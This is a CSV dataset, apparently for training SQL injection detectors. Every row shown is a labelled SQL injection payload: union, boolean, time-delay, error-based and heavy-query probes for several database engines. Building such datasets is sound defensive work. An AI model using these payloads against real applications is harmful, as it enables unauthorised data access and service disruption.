payload,label,source
"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1,"Modified_SQL_Dataset"
"1  )   where 4548  =  4548 and 9198  =  9198--",1,"Modified_SQL_Dataset"
"1 rlike   (  select   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    )",1,"Modified_SQL_Dataset"
"-4807' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'wwki'  =  'wwki",1,"Modified_SQL_Dataset"
"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,"Modified_SQL_Dataset"
"-3151%""   )    )     )   union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",1,"Modified_SQL_Dataset"
"1'+  (  select 'mtpt' where 7483  =  7483 union all select null,null,null,null,null,null,null,null,null--",1,"Modified_SQL_Dataset"
"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",1,"Modified_SQL_Dataset"
"1%""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,1,"Modified_SQL_Dataset"
"1%' and 2006  =  2006",1,"Modified_SQL_Dataset"
"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",1,"Modified_SQL_Dataset"
"-6520%""  )   order by 1#",1,"Modified_SQL_Dataset"
"-9673  )   or 8571  =  8571--",1,"Modified_SQL_Dataset"
"1'||  (  select 'vasx' where 4770  =  4770 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",1,"Modified_SQL_Dataset"
"1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- slje",1,"Modified_SQL_Dataset"
"1  )   as bzuh where 8041  =  8041 and 6307  =  9200#",1,"Modified_SQL_Dataset"
"-9152""   )    )    as avga where 3825  =  3825 order by 1#",1,"Modified_SQL_Dataset"
"1""  )   as pxdq where 2236  =  2236 and 2006  =  2006",1,"Modified_SQL_Dataset"
"1""   )    )    as pqbs where 4409  =  4409",1,"Modified_SQL_Dataset"
"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",1,"Modified_SQL_Dataset"
"-9015%""  )   union all select 6948,6948--",1,"Modified_SQL_Dataset"
"1%'   )    )    union all select null,null,null,null,null,null#",1,"Modified_SQL_Dataset"
"1  )   where 1270  =  1270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,"Modified_SQL_Dataset"
"1"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,"Modified_SQL_Dataset"
"-9653'  )   where 2705  =  2705 or 9323  =  9323#",1,"Modified_SQL_Dataset"
"1  )   union all select null,null,null,null,null,null,null,null,null,null#",1,"Modified_SQL_Dataset"
"-3872%""   )    )     )   union all select 1637,1637,1637,1637,1637#",1,"Modified_SQL_Dataset"
"1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#",1,"Modified_SQL_Dataset"
"1'+  (  select 'vabj' where 7178  =  7178 union all select null,null,null,null,null#",1,"Modified_SQL_Dataset"
"1   )    )    as vzso where 8541  =  8541 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,"Modified_SQL_Dataset"
"1%""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1,"Modified_SQL_Dataset"
"1"" where 4684  =  4684 union all select null,null,null,null#",1,"Modified_SQL_Dataset"
"1' where 1628  =  1628",1,"Modified_SQL_Dataset"
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'dfsj'  =  'dfsj",1,"Modified_SQL_Dataset"
"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",1,"Modified_SQL_Dataset"
"1%""  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,"Modified_SQL_Dataset"
"1""  )   where 8390  =  8390",1,"Modified_SQL_Dataset"
"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,"Modified_SQL_Dataset"
"1""  )   where 5850  =  5850 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,"Modified_SQL_Dataset"
"1"" union all select null,null,null,null,null,null#",1,"Modified_SQL_Dataset"
"if  (  5127  =  2829  )   select 5127 else drop function okos--",1,"Modified_SQL_Dataset"
"1'   )    )    and 4650  =  1322#",1,"Modified_SQL_Dataset"
"-9355' or   (  8459  =  8459  )  *4906 and 'aegf'  =  'aegf",1,"Modified_SQL_Dataset"
"1' union all select null--",1,"Modified_SQL_Dataset"
"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,"Modified_SQL_Dataset"
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )",1,"Modified_SQL_Dataset"
"1 and   (  5369  =  8325  )  *8325# psze",1,"Modified_SQL_Dataset"
"-5196""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""gbcq"" like ""gbcq",1,"Modified_SQL_Dataset"
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,"Modified_SQL_Dataset"
"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,"Modified_SQL_Dataset"
"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",1,"Modified_SQL_Dataset"
"-1641' union all select 4835#",1,"Modified_SQL_Dataset"
"1 and 9198  =  9198--",1,"Modified_SQL_Dataset"
"1""  )   where 9115  =  9115",1,"Modified_SQL_Dataset"
"1   )    )    as xovu where 4530  =  4530 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,"Modified_SQL_Dataset"
"1'||  (  select 'mwpd' where 2887  =  2887",1,"Modified_SQL_Dataset"
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )",1,"Modified_SQL_Dataset"
"-9062"" or 6872  =  6872 and ""aumq"" like ""aumq",1,"Modified_SQL_Dataset"
"1%""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,1,"Modified_SQL_Dataset"
"1 where 2956  =  2956",1,"Modified_SQL_Dataset"
"1%' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,"Modified_SQL_Dataset"
"-4542'   )    )    order by 1#",1,"Modified_SQL_Dataset"
"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,"Modified_SQL_Dataset"
"-1432""   )    )    union all select 9008,9008,9008#",1,"Modified_SQL_Dataset"
"1""   )    )    and 8329  =  5584#",1,"Modified_SQL_Dataset"
"1  )   as imdt where 6431  =  6431",1,"Modified_SQL_Dataset"
"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",1,"Modified_SQL_Dataset"
"-3634%'   )    )    or 2671  =  2434",1,"Modified_SQL_Dataset"
"1""   )    )    and sleep  (  5  )   and    (    (   ""lied"" like ""lied",1,"Modified_SQL_Dataset"
"1' in boolean mode  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",1,"Modified_SQL_Dataset"
"1'+  (  select xruo where 5709  =  5709 and 7533  =  7533  )  +'",1,"Modified_SQL_Dataset"
"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'zjel' like 'zjel",1,"Modified_SQL_Dataset"
"select case when 4488  =  5522 then 1 else null end--",1,"Modified_SQL_Dataset"
"-3059'  )   as jhbh where 4056  =  4056 or   (  3498  =  6965  )  *6965--",1,"Modified_SQL_Dataset"
"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",1,"Modified_SQL_Dataset"
"1"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,"Modified_SQL_Dataset"
"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",1,"Modified_SQL_Dataset"
"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",1,"Modified_SQL_Dataset"
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",1,"Modified_SQL_Dataset"
"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'sqzl'  =  'sqzl",1,"Modified_SQL_Dataset"
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1,"Modified_SQL_Dataset"
"1%""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""%""  =  """,1,"Modified_SQL_Dataset"
"1"" where 1537  =  1537 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,"Modified_SQL_Dataset"
"1  )   and   (  2342  =  3620  )  *3620",1,"Modified_SQL_Dataset"
"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm",1,"Modified_SQL_Dataset"
"1  )   where 1100  =  1100 and sleep  (  5  )  --",1,"Modified_SQL_Dataset"
"1%""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,1,"Modified_SQL_Dataset"
"1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'",1,"Modified_SQL_Dataset"
"1""   )    )    and 9198  =  9198--",1,"Modified_SQL_Dataset"
"1'+  (  select eztr where 4260  =  4260 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",1,"Modified_SQL_Dataset"
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",1,"Modified_SQL_Dataset"
"select   (  case when   (  2294  =  3651  )   then 2294 else 2294*  (  select 2294 from information_schema.character_sets  )   end  )  #",1,"Modified_SQL_Dataset"
"waitfor delay '0:0:5' and    (    (     (  'ywnm'  =  'ywnm",1,"Modified_SQL_Dataset"
"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",1,"Modified_SQL_Dataset"
"1%'   )    )    union all select null,null,null,null,null,null,null,null#",1,"Modified_SQL_Dataset"
"-8331'  )   union all select 1452,1452,1452,1452,1452--",1,"Modified_SQL_Dataset"
"1""   )    )    as dooi where 1806  =  1806 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,"Modified_SQL_Dataset"
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",1,"Modified_SQL_Dataset"
"-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg",1,"Modified_SQL_Dataset"
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""fvtu"" like ""fvtu",1,"Modified_SQL_Dataset"
"-4637' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )",1,"Modified_SQL_Dataset"
"-2373%""  )   or 9323  =  9323#",1,"Modified_SQL_Dataset"
"1  )   and 2006  =  2006",1,"Modified_SQL_Dataset"
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'osov' like 'osov",1,"Modified_SQL_Dataset"
"1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   '%'  =  '",1,"Modified_SQL_Dataset"
"1   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,"Modified_SQL_Dataset"
"-5031' or 9323  =  9323#",1,"Modified_SQL_Dataset"
"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",1,"Modified_SQL_Dataset"
"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1,"Modified_SQL_Dataset"
"1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy",1,"Modified_SQL_Dataset"
"1'+  (  select 'wyxu' where 2555  =  2555 union all select null#",1,"Modified_SQL_Dataset"
"-8735'   )    )    union all select 3262,3262,3262--",1,"Modified_SQL_Dataset"
"-4248""   )    )    union all select 9450,9450,9450--",1,"Modified_SQL_Dataset"
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",1,"Modified_SQL_Dataset"
"1%' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",1,"Modified_SQL_Dataset"
"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --",1,"Modified_SQL_Dataset"
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",1,"Modified_SQL_Dataset"
"1 where 5311  =  5311 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,"Modified_SQL_Dataset"
"-7139""  )   where 2723  =  2723 or 3900  =  5082--",1,"Modified_SQL_Dataset"
"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1,"Modified_SQL_Dataset"
"-3109"" or elt  (  1032  =  1032,3623  )",1,"Modified_SQL_Dataset"
"1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +'",1,"Modified_SQL_Dataset"
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",1,"Modified_SQL_Dataset"
"1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1,"Modified_SQL_Dataset"
"-5245""   )    )     )   union all select 8106,8106,8106#",1,"Modified_SQL_Dataset"
"select   (  case when   (  8716  =  1338  )   then 1 else 8716*  (  select 8716 from master..sysdatabases  )   end  )  --",1,"Modified_SQL_Dataset"
"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'hryb'  =  'hryb",1,"Modified_SQL_Dataset"
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'aumk' like 'aumk",1,"Modified_SQL_Dataset"
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""mofa"" like ""mofa",1,"Modified_SQL_Dataset"
"-6244'  )   as szpd where 8445  =  8445 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,"Modified_SQL_Dataset"
"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,"Modified_SQL_Dataset"
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",1,"Modified_SQL_Dataset"
"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1,"Modified_SQL_Dataset"
"-1040 where 3058  =  3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",1,"Modified_SQL_Dataset"
"-9405'  )   union all select 8283,8283,8283,8283--",1,"Modified_SQL_Dataset"
"1   )    )    as rbae where 2049  =  2049 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,"Modified_SQL_Dataset"
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )",1,"Modified_SQL_Dataset"
"-7868"" union all select 1805--",1,"Modified_SQL_Dataset"
"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",1,"Modified_SQL_Dataset"
"-3821'  )   or 9323  =  9323#",1,"Modified_SQL_Dataset"
"1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,"Modified_SQL_Dataset"
"1' where 5035  =  5035 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,"Modified_SQL_Dataset"
"1' where 1652  =  1652 and sleep  (  5  )  #",1,"Modified_SQL_Dataset"
"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )",1,"Modified_SQL_Dataset"
"1%""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,"Modified_SQL_Dataset"
"1'   )    )    as cwss where 9720  =  9720",1,"Modified_SQL_Dataset"
"-6475""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""mdsx"" like ""mdsx",1,"Modified_SQL_Dataset"
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'nbsf' like 'nbsf",1,"Modified_SQL_Dataset"
"1 where 2914  =  2914 union all select null,null,null#",1,"Modified_SQL_Dataset"
"1"" and 2006  =  2006",1,"Modified_SQL_Dataset"
"1'+  (  select biqo where 6046  =  6046",1,"Modified_SQL_Dataset"
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,1,"Modified_SQL_Dataset"
"1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve",1,"Modified_SQL_Dataset"
"1 rlike sleep  (  5  )  # urxh",1,"Modified_SQL_Dataset"
"1'+  (  select ummn where 8883  =  8883 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",1,"Modified_SQL_Dataset"
"1'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,"Modified_SQL_Dataset"
"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",1,"Modified_SQL_Dataset"
"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""jebr"" like ""jebr",1,"Modified_SQL_Dataset"
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1,"Modified_SQL_Dataset"
"-8069'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'qbvz'  =  'qbvz",1,"Modified_SQL_Dataset"
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""%""  =  """,1,"Modified_SQL_Dataset"
"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",1,"Modified_SQL_Dataset"
"1%'   )    )    union all select null,null,null--",1,"Modified_SQL_Dataset"
"-3998'   )    )    or 3038  =  3038",1,"Modified_SQL_Dataset"
"-2862'   )    )     )   union all select 6649,6649--",1,"Modified_SQL_Dataset"
"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",1,"Modified_SQL_Dataset"
"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,"Modified_SQL_Dataset"
"(  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    )",1,"Modified_SQL_Dataset"
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",1,"Modified_SQL_Dataset"
"-9583'   )    )    union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1,"Modified_SQL_Dataset"
"1%'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '",1,"Modified_SQL_Dataset"
"1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,"Modified_SQL_Dataset"
"-5391 or make_set  (  9354  =  9354,7185  )  # ptyy",1,"Modified_SQL_Dataset"
"-5322"" union all select 6494,6494,6494,6494,6494,6494--",1,"Modified_SQL_Dataset"
"select sleep  (  5  )   and    (    (     (  8354  =  8354",1,"Modified_SQL_Dataset"
"1 and elt  (  4249  =  4249,7259  )  -- meef",1,"Modified_SQL_Dataset"
